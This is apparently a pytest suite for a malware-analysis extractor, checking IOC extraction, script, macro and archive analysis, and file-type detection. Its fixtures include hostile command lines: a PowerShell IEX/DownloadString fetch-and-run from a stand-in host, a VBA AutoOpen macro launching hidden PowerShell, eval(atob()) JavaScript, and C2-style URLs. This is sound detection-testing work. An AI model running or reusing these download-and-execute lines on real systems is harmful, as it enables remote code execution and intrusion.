"""Tests for the file-type router and the specialised extractors."""
import hashlib
import io
import tempfile
import time
import zipfile
from pathlib import Path

import pytest

from conftest import BENIGN_PYTHON, MALICIOUS_PYTHON, REVERSE_SHELL, make_npm_tarball, make_wheel
from extractors import archive_extractor
from extractors.extractor import MasterBinaryExtractor, detect_file_type, get_capabilities
from extractors.ioc import find_iocs, iter_printable_strings
from extractors.macro_extractor import MacroExtractor, scan_macro_source
from extractors.provenance import LexicalProvenanceEngine
from extractors.script_extractor import ScriptExtractor
from extractors.symbolic_resolver import run_with_hard_timeout
from models import ExtractionResult


# ── IOC patterns ─────────────────────────────────────────────

def test_find_iocs_extracts_network_and_host_indicators() -> None:
    text = (
        'x = "http://evil.example/a.bin"; ip=10.1.2.3 '
        r"path=C:\Users\Public\run.exe "
        r"key=HKLM\Software\Microsoft\Windows\CurrentVersion\Run f=/etc/shadow"
    )
    iocs = find_iocs(text)
    assert "http://evil.example/a.bin" in iocs
    assert "10.1.2.3" in iocs
    assert any(i.startswith("C:\\Users\\Public") for i in iocs)
    assert any(i.startswith("HKLM\\Software") for i in iocs)
    assert "/etc/shadow" in iocs


def test_find_iocs_rejects_invalid_ipv4() -> None:
    assert find_iocs("version 999.300.1.1 build") == []


def test_find_iocs_is_ordered_and_unique() -> None:
    iocs = find_iocs("http://a.example/x http://a.example/x http://b.example/y")
    assert iocs == ["http://a.example/x", "http://b.example/y"]


def test_printable_strings_cover_ascii_and_utf16() -> None:
    data = (
        b"\x00\x01http://a.example/x\x00\x02"
        + "C:\\Temp\\evil.dll".encode("utf-16-le")
        + b"\x00\x00\xff"
    )
    strings = list(iter_printable_strings(data))
    assert "http://a.example/x" in strings
    assert "C:\\Temp\\evil.dll" in strings


# ── Script extractor ─────────────────────────────────────────

def test_python_script_indicators(write_sample) -> None:
    path = write_sample("dropper.py", MALICIOUS_PYTHON)
    result = ScriptExtractor().extract(str(path), "dropper.py")

    assert result["language"] == "python"
    assert {"os", "base64", "requests", "subprocess.Popen"} <= set(result["ast_imports"])
    # Whole call sites are reported, not just a regex capture group.
    assert "exec(" in result["suspicious_calls"]
    assert "os.system(" in result["suspicious_calls"]
    assert "requests.post(" in result["suspicious_calls"]
    assert any(blob.startswith("aW1wb3J0IHNvY2tldDtz") for blob in result["encoded_blobs"])
    assert "http://185.220.101.7/drop/stage2.bin" in result["high_value_strings"]
    assert "/etc/shadow" in result["high_value_strings"]
    assert 0.0 < result["obfuscation_score"] <= 8.0


def test_shell_reverse_shell_indicators(write_sample) -> None:
    path = write_sample("install.sh", REVERSE_SHELL)
    result = ScriptExtractor().extract(str(path), "install.sh")

    calls = " | ".join(result["suspicious_calls"])
    assert result["language"] == "shell"
    assert "/dev/tcp/" in calls
    assert "wget" in calls
    assert "chmod +x" in calls
    assert "crontab" in calls
    assert any(s.startswith("/dev/tcp/203.0.113.9") for s in result["high_value_strings"])


def test_powershell_has_its_own_patterns(write_sample) -> None:
    source = (
        "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')\n"
        "powershell -NoP -EncodedCommand SQBFAFgA\n"
    )
    path = write_sample("stage.ps1", source)
    result = ScriptExtractor().extract(str(path), "stage.ps1")

    calls = " | ".join(result["suspicious_calls"]).lower()
    assert result["language"] == "powershell"
    assert "downloadstring" in calls
    assert "iex" in calls
    assert "-encodedcommand" in calls
    assert "http://x.example/a.ps1" in result["high_value_strings"]


def test_javascript_imports_and_calls(write_sample) -> None:
    source = (
        "const cp = require('child_process');\n"
        "import fs from 'fs';\n"
        "import 'side-effect-module';\n"
        "eval(atob('ZG9FdmlsKCk='));\n"
    )
    path = write_sample("index.js", source)
    result = ScriptExtractor().extract(str(path), "index.js")

    assert result["language"] == "javascript"
    assert {"child_process", "fs", "side-effect-module"} <= set(result["ast_imports"])
    assert "eval(" in result["suspicious_calls"]
    assert "child_process" in result["suspicious_calls"]


def test_single_backslash_windows_paths_are_found(write_sample) -> None:
    path = write_sample("run.bat", "copy C:\\Windows\\Temp\\a.exe %TEMP%\r\nreg add HKCU\\Software\\X /v Y\r\n")
    result = ScriptExtractor().extract(str(path), "run.bat")

    assert any(s.startswith("C:\\Windows\\Temp") for s in result["high_value_strings"])
    assert any(s.startswith("HKCU\\Software") for s in result["high_value_strings"])


@pytest.mark.parametrize(
    ("name", "source", "expected"),
    [
        ("payload", "#!/usr/bin/env python3\nprint('hi')\n", "python"),
        ("payload", "#!/bin/sh\necho hi\n", "shell"),
        ("notes", "just some prose about shipping and washing dishes\n", "unknown"),
    ],
)
def test_language_detection_without_extension(write_sample, name: str, source: str, expected: str) -> None:
    path = write_sample(name, source)
    assert ScriptExtractor().extract(str(path), name)["language"] == expected


def test_python2_source_falls_back_to_regex_imports(write_sample) -> None:
    source = 'print "legacy"\nimport socket, os\nfrom urllib import urlopen\n'
    path = write_sample("old.py", source)
    result = ScriptExtractor().extract(str(path), "old.py")
    assert {"socket", "os", "urllib.urlopen"} <= set(result["ast_imports"])


def test_duplicate_long_blobs_are_reported_once(write_sample) -> None:
    blob = "QUJD" * 100
    path = write_sample("blob.py", f'a = "{blob}"\nb = "{blob}"\n')
    result = ScriptExtractor().extract(str(path), "blob.py")
    assert len(result["encoded_blobs"]) == 1


def test_python_mentions_in_text_are_not_calls(write_sample) -> None:
    source = (
        '"""Never call eval() or exec() on user input; compile() is fine."""\n'
        "import re\n"
        'PATTERN = re.compile("x")\n'
    )
    path = write_sample("doc.py", source)
    assert ScriptExtractor().extract(str(path), "doc.py")["suspicious_calls"] == []


def test_python_real_dynamic_calls_are_kept(write_sample) -> None:
    path = write_sample("dyn.py", 'exec(open("x").read())\nvalue = eval("1 + 1")\n')
    calls = ScriptExtractor().extract(str(path), "dyn.py")["suspicious_calls"]
    assert "exec(" in calls
    assert "eval(" in calls


# ── Archives and packages ────────────────────────────────────

def _archive(path: Path) -> dict:
    result = MasterBinaryExtractor().extract_all(str(path), path.name)
    assert result["file_type"] == "archive"
    ExtractionResult.model_validate(result)
    return result["archive_features"]


def test_archives_are_detected(tmp_path: Path) -> None:
    assert detect_file_type(str(make_wheel(tmp_path / "pkg.whl")), "pkg.whl") == "archive"
    assert detect_file_type(str(make_npm_tarball(tmp_path / "pkg.tgz")), "pkg.tgz") == "archive"


def test_wheel_members_are_analyzed(tmp_path: Path) -> None:
    archive = _archive(make_wheel(tmp_path / "totally_legit-1.0-py3-none-any.whl"))

    assert archive["archive_type"] == "wheel"
    assert archive["member_count"] == 4
    assert archive["package"] == {"ecosystem": "PyPI", "name": "totally-legit", "version": "1.0"}
    init = next(m for m in archive["analyzed_members"] if m["path"] == "totally_legit/__init__.py")
    assert init["language"] == "python"
    assert "exec(" in init["suspicious_calls"]
    assert "http://185.220.101.7/drop/stage2.bin" in archive["high_value_strings"]


def test_npm_tarball_reports_install_hooks(tmp_path: Path) -> None:
    archive = _archive(make_npm_tarball(tmp_path / "colors-js-1.4.1.tgz"))

    assert archive["archive_type"] == "npm"
    assert archive["package"] == {"ecosystem": "npm", "name": "colors-js", "version": "1.4.1"}
    assert archive["install_hooks"] == ["postinstall: node install.js"]
    # The script an install hook runs is analysed ahead of ordinary sources.
    assert archive["analyzed_members"][0]["path"] == "package/install.js"
    assert "child_process" in archive["analyzed_members"][0]["suspicious_calls"]


def test_archive_member_limit_is_enforced(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(archive_extractor, "MAX_MEMBERS_ANALYZED", 5)
    path = tmp_path / "many.zip"
    with zipfile.ZipFile(path, "w") as zf:
        for i in range(20):
            zf.writestr(f"src/mod{i}.py", "import os\n")

    archive = _archive(path)

    assert len(archive["analyzed_members"]) == 5
    assert any("15" in note for note in archive["notes"])


def test_oversized_and_nested_members_are_skipped(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(archive_extractor, "MAX_MEMBER_BYTES", 64)
    inner = io.BytesIO()
    with zipfile.ZipFile(inner, "w") as zf:
        zf.writestr("a.py", "x = 1\n")
    path = tmp_path / "mixed.zip"
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("big.py", "x = 1\n" * 100)
        zf.writestr("inner.zip", inner.getvalue())
        zf.writestr("ok.py", "y = 2\n")

    archive = _archive(path)

    assert [m["path"] for m in archive["analyzed_members"]] == ["ok.py"]
    notes = " | ".join(archive["notes"])
    assert "big.py" in notes
    assert "inner.zip" in notes


def test_traversal_member_names_never_touch_the_filesystem(tmp_path: Path) -> None:
    workdir = tmp_path / "a" / "b"
    workdir.mkdir(parents=True)
    path = workdir / "evil.zip"
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("../../escaped.py", MALICIOUS_PYTHON)

    archive = _archive(path)

    assert not list(tmp_path.rglob("escaped.py"))
    assert len(archive["analyzed_members"]) == 1
    assert any("traversal" in note for note in archive["notes"])


def test_archive_member_temp_files_are_removed(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    scratch = tmp_path / "scratch"
    scratch.mkdir()
    monkeypatch.setattr(tempfile, "tempdir", str(scratch))

    _archive(make_wheel(tmp_path / "pkg.whl"))

    assert list(scratch.iterdir()) == []


# ── File-type router ─────────────────────────────────────────

def _ooxml(path: Path) -> Path:
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types/>")
        zf.writestr("word/document.xml", "<w:document/>")
    return path


@pytest.mark.parametrize(
    ("name", "content", "expected"),
    [
        ("sample.bin", b"MZ\x90\x00" + b"\x00" * 64, "pe"),
        ("sample.bin", b"\x7fELF\x02\x01\x01" + b"\x00" * 64, "elf"),
        ("tool.py", b"import os\n", "script"),
        ("runme", b"#!/bin/sh\necho hi\n", "script"),
        ("legacy.bin", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64, "document"),
        ("blob.dat", bytes(range(256)) * 4, "unknown"),
    ],
)
def test_detect_file_type(write_sample, name: str, content: bytes, expected: str) -> None:
    path = write_sample(name, content)
    assert detect_file_type(str(path), name) == expected


def test_magic_bytes_beat_a_misleading_extension(write_sample) -> None:
    path = write_sample("invoice.py", b"MZ\x90\x00" + b"\x00" * 64)
    assert detect_file_type(str(path), "invoice.py") == "pe"


def test_plain_zip_is_not_an_office_document(tmp_path: Path) -> None:
    path = tmp_path / "bundle.zip"
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("readme.txt", "hello")
    assert detect_file_type(str(path), "bundle.zip") != "document"


def test_ooxml_zip_is_an_office_document(tmp_path: Path) -> None:
    path = _ooxml(tmp_path / "report.bin")
    assert detect_file_type(str(path), "report.bin") == "document"


def test_extract_all_script_matches_schema(write_sample) -> None:
    path = write_sample("dropper.py", MALICIOUS_PYTHON)
    result = MasterBinaryExtractor().extract_all(str(path), "dropper.py")

    assert result["file_type"] == "script"
    assert result["status"].startswith("success")
    assert result["metadata"]["sha256"] == hashlib.sha256(MALICIOUS_PYTHON.encode()).hexdigest()
    assert result["metadata"]["md5"] == hashlib.md5(MALICIOUS_PYTHON.encode()).hexdigest()
    assert result["metadata"]["size"] == len(MALICIOUS_PYTHON.encode())
    assert result["binary_features"] is None
    assert result["script_features"]["language"] == "python"
    assert {"ecosystem_match", "legitimate_baseline", "injected_artifacts"} <= set(result["provenance"])
    ExtractionResult.model_validate(result)


def test_extract_all_scans_plain_text_with_unknown_extension(write_sample) -> None:
    path = write_sample("readme.txt", "run: powershell -enc AAAA from http://c2.example/gate.php\n")
    result = MasterBinaryExtractor().extract_all(str(path), "readme.txt")

    assert result["script_features"] is not None
    assert "http://c2.example/gate.php" in result["script_features"]["high_value_strings"]
    ExtractionResult.model_validate(result)


def test_extract_all_pe_falls_back_to_string_scan(write_sample) -> None:
    content = (
        b"MZ\x90\x00" + b"\x00" * 60
        + b"http://c2.example/gate.php\x00"
        + "C:\\Users\\Public\\x.dll".encode("utf-16-le")
        + b"\x00\x00"
    )
    path = write_sample("implant.exe", content)
    result = MasterBinaryExtractor().extract_all(str(path), "implant.exe")

    assert result["file_type"] == "pe"
    strings = result["binary_features"]["high_value_strings"]
    assert "http://c2.example/gate.php" in strings
    assert "C:\\Users\\Public\\x.dll" in strings
    ExtractionResult.model_validate(result)


def test_extract_all_flags_extension_mismatch(write_sample) -> None:
    path = write_sample("invoice.py", b"MZ\x90\x00" + b"\x00" * 64)
    result = MasterBinaryExtractor().extract_all(str(path), "invoice.py")
    assert result["metadata"]["extension_mismatch"] is True


def test_extract_all_unknown_binary_reports_a_warning(write_sample) -> None:
    path = write_sample("blob.dat", bytes(range(256)) * 4)
    result = MasterBinaryExtractor().extract_all(str(path), "blob.dat")

    assert result["file_type"] == "unknown"
    assert result["status"].startswith("warning")
    ExtractionResult.model_validate(result)


def test_capabilities_report_booleans() -> None:
    caps = get_capabilities()
    assert {"radare2", "pefile", "pyelftools", "oletools", "libmagic", "angr"} <= set(caps)
    assert all(isinstance(v, bool) for v in caps.values())


# ── Provenance ───────────────────────────────────────────────

def test_lexical_provenance_matches_hijacked_library() -> None:
    engine = LexicalProvenanceEngine()
    strings = ["User-Agent: python-requests", "http://185.220.101.7/exfil"]
    imports = ["import urllib3", "requests.get", "requests.post", "Session"]

    result = engine.analyze_delta(strings, imports)

    assert result["ecosystem_match"].startswith("PyPI: requests")
    assert "http://185.220.101.7/exfil" in result["injected_artifacts"]
    assert "requests.get" not in result["injected_artifacts"]
    assert "requests.get" in result["legitimate_baseline"]
    assert result["engine"] == "lexical"


def test_lexical_provenance_native_and_empty_inputs() -> None:
    engine = LexicalProvenanceEngine()
    assert engine.analyze_delta([], [])["ecosystem_match"] == "None"

    native = engine.analyze_delta(["http://c2.example/x"], ["socket"])
    assert native["ecosystem_match"].startswith("Native/Unknown")
    assert native["legitimate_baseline"] == []
    assert native["injected_artifacts"] == ["http://c2.example/x", "socket"]


# ── Macro extractor ──────────────────────────────────────────

def test_scan_macro_source_flags_autoexec_and_urls() -> None:
    vba = (
        "Sub AutoOpen()\n"
        '  Set sh = CreateObject("WScript.Shell")\n'
        '  sh.Run "powershell -w hidden IEX(http://bad.example/p.ps1)"\n'
        "End Sub\n"
    )
    scan = scan_macro_source(vba)
    keywords = {k.lower() for k in scan["suspicious_keywords"]}
    assert {"autoopen", "createobject", "wscript.shell", "powershell"} <= keywords
    assert scan["embedded_urls"] == ["http://bad.example/p.ps1"]


def test_macro_extractor_handles_macro_free_ooxml(tmp_path: Path) -> None:
    pytest.importorskip("oletools")
    path = _ooxml(tmp_path / "clean.docx")
    result = MacroExtractor().extract(str(path), "clean.docx")
    assert result["has_macros"] is False
    assert result["macro_source"] is None


# ── Concolic timeout wrapper ─────────────────────────────────

def test_hard_timeout_returns_worker_result() -> None:
    ok, result = run_with_hard_timeout(pow, (2, 5), timeout=60)
    assert ok is True
    assert result == 32


def test_hard_timeout_kills_runaway_worker() -> None:
    started = time.monotonic()
    ok, result = run_with_hard_timeout(time.sleep, (120,), timeout=2)
    assert ok is False
    assert result is None
    assert time.monotonic() - started < 30
